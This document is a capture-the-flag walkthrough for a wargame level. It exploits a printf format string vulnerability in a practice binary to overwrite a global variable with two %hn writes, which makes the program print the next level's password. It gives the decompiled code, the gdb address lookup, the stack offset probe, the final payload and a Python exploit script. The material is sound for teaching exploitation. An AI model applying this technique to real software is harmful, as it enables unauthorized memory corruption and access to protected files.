
---

## Phase 1: Reconnaissance

We find a binary `level4` in our home folder

---

## Phase 2: Static Analysis

Using Ghidra, we identify the main vulnerable function:

```c
void n(void)
{
  char buffer [520];
  
  fgets(buffer,512,stdin);
  p(buffer);
  if (m == 0x1025544) // or 16930116 in decimal
  {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

- - - - - - - - - - - - - - - 

void p(char *str)
{
  printf(str);
  return;
}

```

This level contains the same vulnerability as the previous one  
A **format string vulnerability** through `printf(buffer)`

However, this time the target value is much larger.

From the decompiled code:
```text
    if (m == 0x01025544)
```

Unlike `level3` (where we needed to write 64), we now need to write:
```text
    0x01025544
```
That value equals 16,930,116 in decimal

It's ugly and unrealistic to print 16 million characters using a single `%n` write, so we need a better strategy

---

## Phase 3: Using Smaller Writes

Based on how format writes work:
```text
  %n    -> writes 4 bytes (int)
  %hn   -> writes 2 bytes (short, 0-65535, mod % 65536)
  %hhn  -> writes 1 byte (char, 0–255, mod % 256)
```
So we need to do 2 writes (with %hn) or 4 writes (with %hhn) to build the final 4 byte value


We have two options to write this value

- Option A - using 2 writes (with %hn):
    - lower 2 bytes: 0x5544 (third byte + LSB)
    - upper 2 bytes: 0x0102 (second byte + MSB)

- Option B - using 4 writes (with %hhn):
    - first byte    0x44
    - second byte   0x55
    - third byte    0x02
    - fourth byte   0x01  

We choose Option A because it's simpler

---

## Phase 4: Breaking the Target Value

Target value:

    0x01025544

In little endian:

    44 55 02 01

Split into two halves:
- Lower 2 bytes: `0x5544`
- Upper 2 bytes: `0x0102`

So we must:
1. Write `0x0102` to `m+2`
2. Write `0x5544` to `m`

---

## Phase 5: Finding the Address of `m`

Using gdb:
> `set disassembly-flavor intel`

```text
   0x0804848d <+54>:	mov    eax,ds:0x8049810
   0x08048492 <+59>:	cmp    eax,0x1025544
```

So:

    m = 0x08049810

---

## Phase 6: Finding the Offset

We probe with:
```shell
    AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
```

Output shows:
```shell
    AAAA.001246b0.bffff784.002dfff4.00000000.00000000.bffff748.0804848d.bffff540.00000200.002e0ac0.001257d0.41414141.3830252e
```
- We see `41414141` appearing at the 12th slot, which indicates an offset of 12

So our first address will be used by `%12$...` and the second by `%13$...`

---

## Phase 7: Building the Exploit

We begin the payload with:

    [m+2][m]

Why this order?
It's easier to start with smaller values

So we want to write the high half first (0x0102), then the low half (0x5544)

Addresses in little endian:

    m+2 = 0x08049812 → \x12\x98\x04\x08
    m   = 0x08049810 → \x10\x98\x04\x08

Those 8 bytes are printed as characters, so the counter is already 8 before we do any `%c` padding

---

### First Write (0x0102)

We want the counter to be 258 at the moment of first `%hn` (0x0102 = 258)

We already printed 8 bytes (m+2 + m)

So we need:

    258 - 8 = 250

We add:

    %250c

Then:

    %12$hn

This writes `0x0102` into `m+2`

---

### Second Write (0x5544)

Now for our second write:

```
0x5544 = 21828
```

Current count = 258

So we need:

    21828 - 258 = 21570

We add:

    %21570c

Then:

    %13$hn

This writes `0x5544` into `m`

---

## Final Payload

    "\x12\x98\x04\x08\x10\x98\x04\x08%250c%12$hn%21570c%13$hn"

---

## Phase 8: Writing the Exploit Script

We create it inside `/tmp/exploit.py`:

```python
#!/usr/bin/env python2
import os


# m = 0x08049810
# write high half first (0x0102) to m+2, then low half (0x5544) to m
addr_hi = '\x12\x98\x04\x08'   # m+2
addr_lo = '\x10\x98\x04\x08'   # m

pad1 = '%250c'
pad2 = '%21570c'

hn1 = '%12$hn'
hn2 = '%13$hn'

payload = addr_hi + addr_lo + pad1 + hn1 + pad2 + hn2

with open('/tmp/payload', 'wb') as f:
    f.write(payload)
    
print("Saved to /tmp/payload")
```

---

## Phase 9: Exploitation

Run the script:

```shell
python /tmp/exploit.py
```

And finally pipe it to `./level4` (we dont need a shell here so no `-`)
  
```shell
cat /tmp/payload | ./level4
```


